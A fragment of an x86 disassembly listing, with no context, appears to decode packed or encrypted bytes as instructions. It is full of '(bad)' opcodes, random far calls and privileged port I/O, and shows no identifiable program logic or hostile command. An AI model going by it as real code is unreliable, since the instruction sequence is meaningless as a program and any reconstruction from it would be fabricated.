  40db7a:	cmp    ah,BYTE PTR [ebx+0x40]
  40db7d:	sub    BYTE PTR [eax+0x56],dl
  40db80:	xchg   ebp,eax
  40db81:	aaa    
  40db82:	or     DWORD PTR [edx-0x63],ebx
  40db85:	in     eax,0xe7
  40db87:	adc    eax,0x5cf48e4
  40db8c:	test   eax,0x14224671
  40db91:	mov    WORD PTR [esi],?
  40db93:	loope  0x40db84
  40db95:	xor    bl,BYTE PTR [ebp-0x61adad24]
  40db9b:	fwait
  40db9c:	pusha  
  40db9d:	ins    DWORD PTR es:[edi],dx
  40db9e:	cmp    DWORD PTR [ebx],edx
  40dba0:	fs repz jno 0x40dba8
  40dba4:	es pop edx
  40dba6:	mov    ch,0x40
  40dba8:	pop    edi
  40dba9:	(bad)
  40dbac:	and    DWORD PTR [edx+0x6befc4ca],0xb1f84946
  40dbb6:	cmp    eax,0xa30ea656
  40dbbb:	adc    DWORD PTR [eax-0x16d327bd],ecx
  40dbc1:	ins    DWORD PTR es:[edi],dx
  40dbc2:	mov    ebx,0xb327317e
  40dbc7:	mov    ds:0x75eb4a82,eax
  40dbcc:	mov    bl,0x5e
  40dbce:	and    BYTE PTR [ebp+0x16],ah
  40dbd1:	inc    edi
  40dbd2:	push   edx
  40dbd3:	mov    eax,ebx
  40dbd5:	and    eax,0xcbab664e
  40dbdb:	inc    esp
  40dbdc:	xchg   DWORD PTR [ecx+0x71],esp
  40dbdf:	(bad)  [ebp-0x648854ac]
  40dbe5:	pop    ebx
  40dbe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbe7:	xchg   esi,eax
  40dbe8:	imul   edi,DWORD PTR [edi+0x5c],0x69
  40dbec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbed:	cmp    eax,0x208d433c
  40dbf3:	adc    BYTE PTR [ebx],cl
  40dbf5:	rol    DWORD PTR [eax+0x3c],0x5c
  40dbf9:	mov    ecx,esp
  40dbfb:	popf   
  40dbfc:	jge    0x40dc46
  40dbfe:	lds    eax,FWORD PTR [ebp+0x6f]
  40dc01:	imul   ebx,edx,0x7b65f778
  40dc07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc08:	cdq    
  40dc09:	jno    0x40dbde
  40dc0b:	ret    0xc256
  40dc0e:	lods   eax,DWORD PTR ds:[esi]
  40dc0f:	aaa    
  40dc10:	clc    
  40dc11:	bound  ebx,QWORD PTR [ecx]
  40dc13:	inc    edx
  40dc14:	inc    esp
  40dc15:	or     eax,0xb4308752
  40dc1a:	je     0x40dbfb
  40dc1c:	and    eax,DWORD PTR [ebp-0x1a]
  40dc1f:	lahf   
  40dc20:	sub    al,0x1e
  40dc22:	add    cl,BYTE PTR [edi]
  40dc24:	icebp  
  40dc25:	push   edx
  40dc26:	pop    edi
  40dc27:	shl    ecx,1
  40dc29:	sahf   
  40dc2a:	(bad)  [edi]
  40dc2c:	mov    al,0xf4
  40dc2e:	push   cs
  40dc2f:	jmp    0x40dc60
  40dc31:	cs pushf 
  40dc33:	sub    BYTE PTR [edi-0x8],al
  40dc36:	jbe    0x40dbcc
  40dc38:	bnd jp 0x40dc1b
  40dc3b:	jle    0x40dc67
  40dc3d:	popf   
  40dc3e:	sbb    ecx,DWORD PTR [ecx]
  40dc40:	add    al,0xa3
  40dc42:	push   ecx
  40dc43:	sbb    esp,DWORD PTR [edx]
  40dc45:	test   BYTE PTR [eax+ebp*2],dh
  40dc48:	xchg   esi,eax
  40dc49:	add    esi,DWORD PTR [ebp-0x47]
  40dc4c:	popa   
  40dc4d:	sbb    dh,0x52
  40dc50:	inc    edx
  40dc51:	(bad)  
  40dc52:	push   0xe2eb26c0
  40dc57:	add    al,0x1
  40dc59:	cmp    bl,cl
  40dc5b:	xchg   edi,eax
  40dc5c:	loop   0x40dcc6
  40dc5e:	(bad)  [eax-0x282d61fe]
  40dc64:	and    eax,0x1b7bc1c6
  40dc69:	add    DWORD PTR [ebp+0x0],edx
  40dc6c:	sub    BYTE PTR [esi+esi*1-0x5c],bh
  40dc70:	xchg   DWORD PTR ds:0x3525566a,ebp
  40dc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc77:	loop   0x40dcac
  40dc79:	sti    
  40dc7a:	popa   
  40dc7b:	jnp    0x40dc69
  40dc7d:	call   0x1974:0xfb63986c
  40dc84:	call   0x8d8c:0x45272e34
  40dc8b:	int3   
  40dc8c:	push   0xffffffe1
  40dc8e:	gs pop edi
  40dc90:	add    eax,0x4e88719e
  40dc95:	and    edi,DWORD PTR [ebx]
  40dc97:	je     0x40dc42
  40dc99:	scas   eax,DWORD PTR es:[edi]
  40dc9a:	mov    cl,0x8b
  40dc9c:	sbb    ebp,esi
  40dc9e:	xcrypt-cbc (bad)
  40dc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dca0:	nop
  40dca1:	mov    edx,0xae4d7a8a
  40dca6:	sbb    bh,BYTE PTR [eax]
  40dca8:	push   edx
  40dca9:	in     eax,0xd2
  40dcab:	mov    ch,0xd8
  40dcad:	xchg   edx,eax
  40dcae:	sbb    BYTE PTR [ecx+0x36],0x3a
  40dcb2:	rcl    DWORD PTR [eax],cl
  40dcb4:	lods   al,BYTE PTR ds:[esi]
  40dcb5:	pop    edx
  40dcb6:	mov    al,0x96
  40dcb8:	mov    eax,ds:0x89cd7ed5
  40dcbd:	mov    al,0x33
  40dcbf:	mov    WORD PTR [ebp+0x6eb5fe53],es
  40dcc5:	inc    ebp
  40dcc6:	add    BYTE PTR [ecx+0x78],dl
  40dcc9:	sbb    eax,DWORD PTR [eax]
  40dccb:	xchg   ebp,eax
  40dccc:	ja     0x40dd25
  40dcce:	mov    DWORD PTR ds:0x35a57fa7,0x49b42c1c
  40dcd8:	out    dx,al
  40dcd9:	mov    ah,0xb6
  40dcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcdc:	xchg   ebp,eax
  40dcdd:	jecxz  0x40dcb3
  40dcdf:	js     0x40dd49
  40dce1:	repnz into 
  40dce3:	popa   
  40dce4:	fcomp  DWORD PTR [edi]
  40dce6:	xchg   esp,eax
  40dce7:	aad    0xe7
  40dce9:	jecxz  0x40dd50
  40dceb:	fsub   st(1),st
  40dced:	push   cs
  40dcee:	or     ebx,DWORD PTR [edx+ebx*1]
  40dcf1:	shl    BYTE PTR [eax],1
  40dcf3:	aas    
  40dcf4:	xor    BYTE PTR [ebp-0x41],0x11
  40dcf8:	sub    esi,DWORD PTR [edi]
  40dcfa:	(bad)  
  40dcfb:	push   ecx
  40dcfc:	push   ss
  40dcfd:	jns    0x40dd40
  40dcff:	mov    dl,0x17
  40dd01:	dec    esp
  40dd02:	adc    ecx,esi
  40dd04:	fistp  DWORD PTR [edi+0x34]
  40dd07:	les    esp,FWORD PTR [eax+0xb478092]
  40dd0d:	ret    
  40dd0e:	cmp    ebp,DWORD PTR [ebx+ecx*8+0x3d]
  40dd12:	fwait
  40dd13:	push   ebx
  40dd14:	cmp    edx,DWORD PTR [ebx+0x7d]
  40dd17:	pop    es
  40dd18:	cmc    
  40dd19:	jmp    0xb467:0xc2c1d4f3
  40dd20:	jecxz  0x40dd70
  40dd22:	mov    dh,0x7c
  40dd24:	jecxz  0x40dce6
  40dd26:	sbb    ah,BYTE PTR [edx+0x7b]
  40dd29:	mov    esp,eax
  40dd2b:	sbb    ch,0x35
  40dd2e:	adc    BYTE PTR [ebx+0x38a43c3f],dl
  40dd34:	adc    eax,0x40850eed
  40dd39:	mov    ch,0x38
  40dd3b:	pop    ds
  40dd3c:	ror    ebx,cl
  40dd3e:	addr16 mov esi,0xc35933c0
  40dd44:	aad    0x78
  40dd46:	mov    ds:0x272dfe0a,al
  40dd4b:	out    dx,al
  40dd4c:	js     0x40dd1d
  40dd4e:	cli    
  40dd4f:	xchg   ecx,eax
  40dd50:	fisub  DWORD PTR [esp+ebp*1+0x28]
  40dd54:	push   edi
  40dd55:	cmp    al,0x1f
  40dd57:	push   esi
  40dd58:	adc    al,0x65
  40dd5a:	xchg   edx,eax
  40dd5b:	mov    ch,0xc1
  40dd5d:	outs   dx,BYTE PTR ds:[esi]
  40dd5e:	adc    eax,DWORD PTR [esi-0x12]
  40dd61:	shl    BYTE PTR [esp+ebp*1],0x31
  40dd65:	inc    ecx
  40dd66:	push   edi
  40dd67:	call   0xa50a:0x336b8bb7
  40dd6e:	pop    ebp
  40dd6f:	mov    eax,ds:0xf2aa6404
  40dd74:	xlat   BYTE PTR ds:[ebx]
  40dd75:	call   0x6ee5d213
  40dd7a:	push   esi
  40dd7b:	arpl   cx,si
  40dd7d:	xor    DWORD PTR [ecx+0x65cc48a6],eax
  40dd83:	mov    bl,0xf5
  40dd85:	outs   dx,BYTE PTR ds:[esi]
  40dd87:	test   esi,ebp
  40dd89:	adc    ebx,esi
  40dd8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd8c:	inc    BYTE PTR [edi+0x1]
  40dd8f:	cld    
  40dd90:	sbb    BYTE PTR [eax],bh
  40dd92:	push   cs
  40dd93:	xchg   esi,eax
  40dd94:	pop    es
  40dd95:	test   BYTE PTR [ebx],0xee
  40dd98:	out    dx,eax
  40dd99:	xchg   esi,eax
  40dd9a:	ja     0x40dd20
  40dd9c:	xor    al,BYTE PTR [esi-0x3c60ef3e]
  40dda2:	shr    DWORD PTR [edi+ebp*2-0x10],0xfb
  40dda7:	and    eax,0xfe168d5c
  40ddac:	mov    dl,0xac
  40ddae:	mov    ebx,0x821c99ce
  40ddb3:	sbb    al,0x10
  40ddb5:	adc    esi,DWORD PTR [esi+0x3f2bb0a7]
  40ddbb:	daa    
  40ddbc:	inc    esi
  40ddbd:	nop
  40ddbe:	xchg   edx,eax
  40ddbf:	in     al,0x30
  40ddc1:	push   ecx
  40ddc2:	clc    
  40ddc3:	mov    fs,WORD PTR [edi+0x13c5d43d]
  40ddc9:	into   
  40ddca:	sub    al,0xee
  40ddcc:	leave  
  40ddcd:	cmp    eax,0xbc834e4d
  40ddd2:	jns    0x40ddd6
  40ddd4:	lods   eax,DWORD PTR ds:[esi]
  40ddd5:	rcr    bl,1
  40ddd7:	xchg   ecx,eax
  40ddd8:	data16 test al,0xea
  40dddb:	xor    DWORD PTR [eax+0x772a17bd],0xffffff9a
  40dde2:	cmp    DWORD PTR [ebp+0x6d],esi
  40dde5:	repz in eax,dx
  40dde7:	inc    esi
  40dde8:	pop    ecx
  40dde9:	adc    al,0xc4
  40ddeb:	(bad)  
  40ddec:	cli    
  40dded:	push   ebx
  40ddee:	in     al,dx
  40ddef:	scas   eax,DWORD PTR es:[edi]
  40ddf0:	and    BYTE PTR [ebp-0x5495f45d],dl
  40ddf6:	cmp    eax,0x42dd2a75
  40ddfb:	out    0x1c,eax
  40ddfd:	ret    0x5e50
  40de00:	rcr    BYTE PTR [eax+0x74c372f0],1
  40de06:	dec    ecx
  40de07:	or     DWORD PTR [ebp+0x3763348c],0x24e8e7c5
  40de11:	stc    
  40de12:	push   ds
  40de13:	cs out dx,eax
  40de15:	pop    esi
  40de16:	pop    ds
  40de17:	or     BYTE PTR [esi],ch
  40de19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1a:	jmp    FWORD PTR [ebp-0x34]
  40de1d:	repnz cmp ebp,DWORD PTR [ebp+0x82bc594]
  40de24:	in     al,dx
  40de25:	into   
  40de26:	pop    edx
  40de27:	sub    DWORD PTR [eax+0x80c7aed],ebp
  40de2d:	sbb    al,0x87
  40de2f:	fisubr DWORD PTR [eax+ebx*8+0x7f0ab43b]
  40de36:	cli    
  40de37:	and    BYTE PTR [edx-0x32784a86],ch
  40de3d:	outs   dx,DWORD PTR ds:[esi]
  40de3e:	ret    0x1d5d
  40de41:	in     eax,dx
  40de42:	pop    ebx
  40de43:	xchg   edi,eax
  40de44:	lods   eax,DWORD PTR ds:[esi]
  40de45:	add    BYTE PTR [eax],dl
  40de47:	and    BYTE PTR [eax],dl
  40de49:	sbb    bh,BYTE PTR [ebp+0x2f]
  40de4c:	pop    ds
  40de4d:	and    BYTE PTR [esi+0x508a4268],dh
  40de53:	sbb    dl,bl
  40de55:	repz cmp dh,BYTE PTR [ebx-0x5cadc6e1]
  40de5c:	or     al,0x1
  40de5e:	add    DWORD PTR [esi+0x46],ecx
  40de61:	imul   esp,DWORD PTR [edi+edx*1],0x72dc9225
  40de68:	sub    ah,BYTE PTR [ebp-0x68]
  40de6b:	repz cmc 
  40de6d:	push   edx
  40de6e:	sbb    eax,0x73fadd89
  40de73:	or     DWORD PTR [edx+0x17246e40],esp
  40de79:	hlt    
  40de7a:	sbb    ah,BYTE PTR [edx-0x2f8c12e0]
  40de80:	xor    ch,bh
  40de82:	aad    0x83
  40de84:	repnz call 0xc64e:0x1c68c884
  40de8c:	leave  
  40de8d:	in     eax,dx
  40de8e:	scas   al,BYTE PTR es:[edi]
  40de8f:	pop    edx
  40de90:	xor    eax,0xf8e55b88
  40de95:	add    bh,BYTE PTR [edx+edx*2]
  40de98:	aas    
  40de99:	jecxz  0x40ded8
  40de9b:	and    dl,cl
  40de9d:	ja     0x40de56
  40de9f:	inc    ecx
  40dea0:	mov    edx,0x853652df
  40dea5:	inc    edi
  40dea6:	sub    ecx,DWORD PTR [eax+0x2beaf9fa]
  40deac:	lea    edi,[edi-0x3f]
  40deaf:	dec    edx
  40deb0:	dec    ecx
  40deb1:	mov    eax,0xacc3da4f
  40deb6:	and    DWORD PTR [eax],0xcb95c5f
  40debc:	mov    bh,0x9e
  40debe:	imul   ebx,ecx,0xfffffff7
  40dec1:	std    
  40dec2:	sub    eax,0xf8148b41
  40dec7:	mov    edx,0xd5ebfb7b
  40decc:	ficom  DWORD PTR [eax+0x76]
  40decf:	and    eax,0xa0df6144
  40ded4:	loop   0x40df47
  40ded6:	xor    eax,0x9a80f781
  40dedb:	mov    eax,ds:0x7b0a1121
  40dee0:	fcmovu st,st(5)
  40dee2:	out    0xba,al
  40dee4:	mov    eax,ds:0x60f319f4
  40dee9:	in     eax,dx
  40deea:	xchg   esi,eax
  40deeb:	fiadd  WORD PTR [ebx+0x6cf540a6]
  40def1:	hlt    
  40def2:	ja     0x40df15
  40def4:	xor    al,0x1a
  40def6:	ss ds div dl
  40defa:	(bad)  
  40defb:	pushf  
  40defc:	data16 mov cl,0x5b
  40deff:	js     0x40df6b
  40df01:	sti    
  40df02:	push   eax
  40df03:	out    dx,al
  40df04:	call   0xe712:0x97d6f59c
  40df0b:	fcmovnu st,st(0)
  40df0d:	xor    BYTE PTR ss:[ecx],0x9c
  40df11:	xchg   ebx,eax
  40df12:	dec    ebx
  40df13:	mov    ds:0x38f2dc9,al
  40df18:	lods   al,BYTE PTR ds:[esi]
  40df19:	adc    al,0xcf
  40df1b:	jnp    0x40df9c
  40df1d:	neg    ebx
  40df1f:	push   0x7a44b3bc
  40df24:	pop    ss
  40df25:	pop    ecx
  40df27:	pop    es
  40df28:	sbb    ebx,DWORD PTR [edi-0x65]
  40df2b:	outs   dx,BYTE PTR ds:[esi]
  40df2c:	test   BYTE PTR [esi+0x2b8f1876],ch
  40df32:	xchg   DWORD PTR [bp+si-0x76],edi
  40df36:	ss nop
  40df38:	ret    0x8596
  40df3b:	dec    ecx
  40df3c:	in     eax,dx
  40df3d:	sbb    DWORD PTR [eax],edi
  40df3f:	push   ss
  40df40:	adc    eax,0x1d49a6d9
  40df45:	or     al,0xac
  40df47:	scas   al,BYTE PTR es:[edi]
  40df48:	loopne 0x40dedd
  40df4a:	lods   eax,DWORD PTR ds:[esi]
  40df4b:	xchg   dl,bh
  40df4d:	loop   0x40df33
  40df4f:	and    DWORD PTR es:[ebx-0x65aa704],ebx
  40df56:	fwait
  40df57:	dec    esi
  40df58:	inc    edi
  40df59:	inc    ecx
  40df5a:	push   ss
  40df5b:	xchg   bh,bh
  40df5d:	add    BYTE PTR [ebx*8-0x1068dc7e],dh
  40df64:	(bad)  
  40df65:	scas   al,BYTE PTR es:[edi]
  40df66:	lock jmp 0xea8d:0x797a3fbf
  40df6e:	in     al,0xe5
  40df70:	pop    ebp
  40df71:	shl    BYTE PTR [edi-0x4],1
  40df74:	or     al,dh
  40df76:	int    0x33
  40df78:	jl     0x40df8c
  40df7a:	mov    gs,WORD PTR [ebx-0xc]
  40df7d:	fmul   DWORD PTR [edx+0x17]
  40df80:	mov    BYTE PTR [edi],0x98
  40df83:	sub    dl,bl
  40df85:	(bad)  
  40df87:	popa   
  40df88:	jp     0x40dfc3
  40df8a:	mov    bh,0xc3
  40df8c:	add    al,0xbb
  40df8e:	mov    ch,0x6a
  40df90:	icebp  
  40df91:	data16 jl 0x40df9d
  40df94:	push   DWORD PTR [ecx+0x4a]
  40df97:	mov    edx,0x2fd3fa7f
  40df9c:	data16 or BYTE PTR [esi],0x26
  40dfa0:	inc    esp
  40dfa1:	mov    ebx,DWORD PTR [ecx+0x5924e83f]
  40dfa7:	lds    edx,FWORD PTR [ebx]
  40dfa9:	cs xchg esp,eax
  40dfab:	pop    edi
  40dfac:	pop    edx
  40dfad:	lds    ebx,FWORD PTR [esi+0xe6b7577]
  40dfb3:	push   es
  40dfb4:	in     eax,dx
  40dfb5:	jmp    0x40df9e
  40dfb7:	push   eax
  40dfb8:	xor    BYTE PTR [edx+eax*1+0x621d7c3a],cl
  40dfbf:	lods   eax,DWORD PTR ds:[esi]
  40dfc0:	jnp    0x40e018
  40dfc2:	dec    ecx
  40dfc3:	ss into 
  40dfc5:	or     ebx,DWORD PTR [eax-0x25]
  40dfc8:	inc    ebx
  40dfc9:	aad    0x33
  40dfcb:	or     edi,DWORD PTR [eax-0x46]
  40dfce:	bound  ecx,QWORD PTR [edi+0x79]
  40dfd1:	jl     0x40dfb8
  40dfd3:	icebp  
  40dfd4:	(bad)  
  40dfd5:	stos   DWORD PTR es:[edi],eax
  40dfd6:	rcl    dl,0xf
  40dfd9:	nop
  40dfda:	push   esp
  40dfdb:	test   ebx,0x2329c6b9
  40dfe1:	retf   
  40dfe2:	sbb    al,0xef
  40dfe4:	cmp    edi,DWORD PTR [eax+esi*8-0x4fdae33]
  40dfeb:	icebp  
  40dfec:	js     0x40dfc5
  40dfee:	fcomp  DWORD PTR [ecx]
  40dff0:	cdq    
  40dff1:	aaa    
  40dff2:	scas   al,BYTE PTR es:[edi]
  40dff3:	mov    esi,0x55d135c6
  40dff8:	jl     0x40dfd2
  40dffa:	pop    ebp
  40dffb:	out    dx,al
  40dffc:	xor    eax,0x7dbe78b4
  40e001:	fisttp WORD PTR [edx+0x17b3c1b7]
  40e007:	ins    DWORD PTR es:[edi],dx
  40e008:	gs mov edi,0xc505bcb7
  40e00e:	add    eax,0xba84ef45
  40e013:	ret    0xc9bb
  40e016:	push   esi
  40e017:	ds mov esi,0xea25c482
  40e01d:	fs pop edx
  40e01f:	adc    eax,0x85207505
  40e024:	(bad)  
  40e025:	mov    ebp,0x6b703476
  40e02a:	dec    edi
  40e02b:	or     BYTE PTR [ecx],al
  40e02d:	mov    edi,0xb55817f3
  40e032:	nop
  40e033:	or     BYTE PTR [ebp+0x19],dh
  40e036:	lock (bad) 
  40e038:	jmp    0x6a22cb94
  40e03d:	test   eax,0x260cf94
  40e042:	dec    edi
  40e043:	inc    edx
  40e044:	fidivr WORD PTR [edx-0x5544f684]
  40e04a:	lods   al,BYTE PTR ds:[esi]
  40e04b:	inc    edi
  40e04c:	stc    
  40e04d:	stos   DWORD PTR es:[edi],eax
  40e04e:	xchg   BYTE PTR [ebx-0x56381724],bh
  40e054:	sbb    BYTE PTR [edi-0x7af6c7bb],al
  40e05a:	dec    edx
  40e05b:	in     eax,dx
  40e05c:	cmp    dl,BYTE PTR [ecx-0x44]
  40e05f:	out    0xc0,eax
  40e061:	and    eax,0xed3a35b8
  40e066:	dec    esp
  40e067:	xor    edx,edi
  40e069:	ret    0x1f8e
  40e06c:	cmc    
  40e06d:	lea    ebp,[edi-0x54cf5e1a]
  40e073:	jne    0x40e054
  40e075:	fstp   QWORD PTR [edi-0x351bcc07]
  40e07b:	xor    eax,0x98b9932d
  40e080:	data16 mov al,BYTE PTR [ecx-0x4a52efb2]
  40e087:	and    ah,BYTE PTR [ecx+0x5]
  40e08a:	pusha  
  40e08b:	jae    0x40e0f9
  40e08d:	out    dx,al
  40e08e:	and    bh,dl
  40e090:	icebp  
  40e091:	mov    WORD PTR ds:0x7f86997e,es
  40e097:	cmp    al,0x47
  40e099:	add    edi,eax
  40e09b:	and    DWORD PTR [esi-0x4e],ebx
  40e09e:	test   BYTE PTR [ebx+0x20b54d5e],dl
  40e0a4:	sahf   
  40e0a5:	(bad)  
  40e0a6:	out    dx,al
  40e0a7:	jg     0x40e127
  40e0a9:	fs scas eax,DWORD PTR es:[edi]
  40e0ab:	sub    al,0x2e
  40e0ad:	inc    ebp
  40e0ae:	add    ah,BYTE PTR gs:[ebp+ebx*8+0x36]
  40e0b3:	xchg   ebx,eax
  40e0b4:	jne    0x40e10d
  40e0b6:	push   esi
  40e0b7:	xlat   BYTE PTR ds:[ebx]
  40e0b8:	loop   0x40e0d2
  40e0ba:	sbb    eax,0x12ac2284
  40e0bf:	ror    DWORD PTR [edi+0x7f9da63],0xe3
  40e0c6:	arpl   WORD PTR [ecx],dx
  40e0c8:	push   edx
  40e0c9:	sbb    DWORD PTR [eax+eax*4],ebp
  40e0cc:	jg     0x40e0d5
  40e0ce:	or     eax,0xd8d7604
  40e0d3:	jbe    0x40e081
  40e0d5:	jle    0x40e0a6
  40e0d7:	mov    ch,0xc2
  40e0d9:	pop    es
  40e0da:	pop    esp
  40e0db:	adc    ecx,DWORD PTR [eax]
  40e0dd:	push   0x23
  40e0df:	rcr    bh,cl
  40e0e1:	xchg   esi,eax
  40e0e2:	fs dec edi
  40e0e4:	pop    ebx
  40e0e5:	xor    BYTE PTR [ebx-0x562446ef],ah
  40e0eb:	and    bl,BYTE PTR [edx-0xa]
  40e0ee:	nop
  40e0ef:	add    bh,BYTE PTR [edi+0x7c]
  40e0f2:	loop   0x40e118
  40e0f4:	es int 0x93
  40e0f7:	xor    al,0x7b
  40e0f9:	add    al,0x89
  40e0fb:	(bad)  
  40e0fc:	xchg   ebx,eax
  40e0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0fe:	int3   
  40e0ff:	imul   ebx,DWORD PTR [edx-0x36061ef7],0xafd459c1
  40e109:	jl     0x40e0e3
  40e10b:	popf   
  40e10c:	mov    dh,dh
  40e10e:	scas   al,BYTE PTR es:[edi]
  40e10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e110:	xchg   ecx,eax
  40e111:	mov    eax,0x4ffe38ab
  40e116:	lods   eax,DWORD PTR ds:[esi]
  40e117:	dec    eax
  40e118:	lea    eax,[edi-0x3cf0f92c]
  40e11e:	test   eax,0xba81d57a
  40e123:	frstor [esp+ecx*8+0x6120db40]
  40e12a:	and    ecx,DWORD PTR [eax]
  40e12c:	cmp    DWORD PTR [esi-0x18],esi
  40e12f:	mul    BYTE PTR [ebp+0x210cbef3]
  40e135:	push   ecx
  40e136:	ins    DWORD PTR es:[edi],dx
  40e137:	jnp    0x40e0be
  40e139:	imul   esi,DWORD PTR [esi-0x6812cff1],0x1dbb6752
  40e143:	retf   
  40e144:	out    dx,al
  40e145:	sbb    al,0xe7
  40e147:	cld    
  40e148:	pop    esi
  40e149:	adc    eax,0xf9b3e272
  40e14e:	clc    
  40e14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e150:	sub    DWORD PTR [ebx-0xf],esp
  40e153:	mov    edi,0xefbb6ae5
  40e158:	imul   eax,DWORD PTR [edi-0x30],0x31
  40e15c:	out    dx,al
  40e15d:	addr16 pop edi
  40e15f:	ins    DWORD PTR es:[edi],dx
  40e160:	inc    esp
  40e161:	cmp    eax,0x88aa83f3
  40e166:	and    al,0x49
  40e169:	jge    0x40e102
  40e16b:	jmp    0x40e0f9
  40e16d:	xchg   edi,eax
  40e16e:	mov    BYTE PTR [ebp+ebp*1+0x52],bl
  40e172:	lock jg 0x40e1c9
  40e175:	or     DWORD PTR [edx+0x10],ebx
  40e178:	lods   al,BYTE PTR ds:[esi]
  40e179:	sbb    BYTE PTR [eax-0x3916a956],cl
  40e17f:	add    al,0xb8
  40e181:	scas   eax,DWORD PTR es:[edi]
  40e182:	mov    bl,0x5e
  40e184:	aaa    
  40e185:	jecxz  0x40e13d
  40e187:	xor    dl,BYTE PTR [edx+0x7d909964]
  40e18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e18e:	es inc eax
  40e190:	sub    bh,BYTE PTR [ecx-0x28]
  40e193:	adc    DWORD PTR [edx-0x532d0502],ebx
  40e199:	sbb    DWORD PTR [eax+0x62],esi
  40e19c:	mov    ch,0x70
  40e19e:	call   0xa0bbfbea
  40e1a3:	std    
  40e1a4:	aad    0x7b
  40e1a6:	xchg   esi,eax
  40e1a7:	dec    BYTE PTR [eax]
  40e1a9:	outs   dx,DWORD PTR ds:[esi]
  40e1aa:	push   esi
  40e1ab:	mov    al,0xc9
  40e1ad:	rcl    DWORD PTR ds:0x360898f5,0x37
  40e1b4:	sub    DWORD PTR [esi+ebp*8],0xfffffff3
  40e1b8:	sbb    DWORD PTR [ecx-0x77f03ae6],ebx
  40e1be:	add    BYTE PTR [edi],bl
  40e1c0:	sbb    al,bh
  40e1c2:	inc    esp
  40e1c3:	cs jnp 0x40e187
  40e1c6:	push   0x5963d072
  40e1cb:	mov    al,ss:0xcf255c36
  40e1d1:	gs pop edi
  40e1d3:	pop    edx
  40e1d4:	pop    esp
  40e1d5:	pop    edi
  40e1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1d7:	(bad)  
  40e1d8:	bnd jle 0x40e1af
  40e1db:	(bad)  
  40e1dc:	fdivr  QWORD PTR [edi-0x4d]
  40e1df:	rcl    dh,1
  40e1e1:	ins    DWORD PTR es:[edi],dx
  40e1e2:	ins    BYTE PTR es:[edi],dx
  40e1e3:	dec    ecx
  40e1e4:	repz or al,0x28
  40e1e7:	mov    ch,BYTE PTR [ebx+0x4f]
  40e1ea:	setae  BYTE PTR [edi-0x720ac6fa]
  40e1f1:	pop    edi
  40e1f2:	data16 jecxz 0x40e1f3
  40e1f5:	inc    ebx
  40e1f6:	les    ebp,FWORD PTR ds:0x4bb0966e
  40e1fc:	push   edx
  40e1fd:	xchg   esi,eax
  40e1fe:	or     eax,0x7db02015
  40e203:	inc    eax
  40e204:	mov    ss,WORD PTR [ecx-0x4e]
  40e207:	(bad)  
  40e208:	test   eax,0x39bab6f
  40e20d:	fwait
  40e20e:	repz cmp DWORD PTR [edi],esp
  40e211:	adc    cl,bl
  40e213:	icebp  
  40e214:	int    0xc9
  40e216:	cld    
  40e217:	jmp    0xda68c417
  40e21c:	xchg   edx,eax
  40e21d:	mov    WORD PTR [esi-0x2f],ds
  40e220:	stos   DWORD PTR es:[edi],eax
  40e221:	mov    dh,0x22
  40e223:	sar    DWORD PTR [eax+0x47],cl
  40e226:	es sti 
  40e228:	xchg   BYTE PTR [edx+ebx*4-0x58],dl
  40e22c:	mov    dl,0xfd
  40e22e:	dec    esp
  40e22f:	mov    edx,0x9ea31372
  40e234:	test   DWORD PTR [ebp-0x53],esp
  40e237:	ret    0x1634
  40e23a:	out    dx,eax
  40e23b:	shl    DWORD PTR [edx],cl
  40e23d:	ins    DWORD PTR es:[edi],dx
  40e23e:	mov    al,ds:0xe6ff579a
  40e243:	dec    ebp
  40e244:	sti    
  40e245:	test   BYTE PTR [eax+0x8205425],ah
  40e24b:	(bad)  
  40e24e:	push   eax
  40e24f:	das    
  40e250:	repz sahf 
  40e252:	stos   BYTE PTR es:[edi],al
  40e253:	clc    
  40e254:	loop   0x40e1ef
  40e256:	pop    edx
  40e257:	dec    eax
  40e258:	in     al,dx
  40e259:	sbb    eax,ebp
  40e25b:	add    al,0xb6
  40e25d:	mul    DWORD PTR [esi+eax*4+0x75]
  40e261:	stos   DWORD PTR es:[edi],eax
  40e262:	jb     0x40e1e4
  40e264:	push   ds
  40e265:	jno    0x40e22a
  40e267:	push   es
  40e268:	xor    ah,BYTE PTR [esi+0x7b2cc42e]
  40e26e:	push   edi
  40e26f:	out    dx,al
  40e270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e271:	pop    edx
  40e272:	rcl    BYTE PTR [ebp+ebp*4+0x52b5a1ee],cl
  40e279:	or     al,0x92
  40e27b:	cmp    dl,BYTE PTR [ebp-0x4f]
  40e27e:	push   edx
  40e27f:	xchg   BYTE PTR [esi],al
  40e281:	ror    eax,1
  40e283:	scas   al,BYTE PTR es:[edi]
  40e284:	ins    BYTE PTR es:[edi],dx
  40e285:	gs inc ecx
  40e287:	mov    edx,0x74a107c5
  40e28c:	xchg   esp,eax
  40e28d:	fmul   DWORD PTR [edi+eax*8+0x16fe5576]
  40e294:	imul   ebx,DWORD PTR [ebp+0xd],0xfffffff6
  40e298:	scas   eax,DWORD PTR es:[edi]
  40e299:	jmp    0x40e236
  40e29b:	pop    edx
  40e29c:	jmp    0x40e2f1
  40e29e:	ficomp WORD PTR [edi]
  40e2a0:	push   0x8e8ff65b
  40e2a5:	jae    0x40e24b
  40e2a7:	mov    eax,0x382a0a46
  40e2ac:	arpl   WORD PTR [esi],cx
  40e2ae:	jo     0x40e25a
  40e2b0:	pop    DWORD PTR [edx+0x3b]
  40e2b3:	xor    eax,0x80cf42f5
  40e2b8:	ins    DWORD PTR es:[edi],dx
  40e2b9:	jbe    0x40e25b
  40e2bb:	outs   dx,BYTE PTR ds:[esi]
  40e2bc:	repnz sar BYTE PTR [esi],1
